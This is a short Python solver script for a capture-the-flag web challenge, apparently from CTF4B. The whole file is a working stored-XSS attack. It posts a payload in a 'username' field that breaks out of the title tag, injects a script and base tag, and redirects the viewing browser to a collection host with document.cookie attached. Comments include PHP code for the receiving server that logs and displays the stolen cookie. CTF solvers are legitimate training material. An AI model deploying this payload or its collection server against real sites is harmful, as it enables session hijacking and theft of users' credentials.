import requests
import os
from time import sleep

target_url_base = "https://{}:{}".format(os.getenv("CTF4B_HOST"),
                                         os.getenv("CTF4B_PORT"))

# NOTE:
# before running solver, you should place following scripts somewhere (e.g. http://solver.example/record.php).
# 
# record.php
# ```
# <?php
# file_put_contents("ctf4b_log.txt", $_GET['q']);
# echo 'logged';
# ?>
# ```
#
# view.php
# ```
# <?php
# echo file_get_contents("ctf4b_log.txt");
# ?>
# ```

# clear the record server
r = requests.get("http://solver.example/record.php?q=clear")
assert(r.status_code == 200)

# ensure the record was cleared
assert('ctf4b' not in requests.get("http://solver.example/view.php").text)

# query the payload
r = requests.post(target_url_base + "/inquiry", data = {
    "username": "document.location=`http://solver.example/record.php?q=${encodeURIComponent(document.cookie)}`;//</title><script id=\"message\"></script><base href=\"http://example.com\">"
    
})
assert(r.status_code == 200)

# wait for crawler
sleep(30)

# check the record server
print(requests.get("https://solver.example/view.php").text)
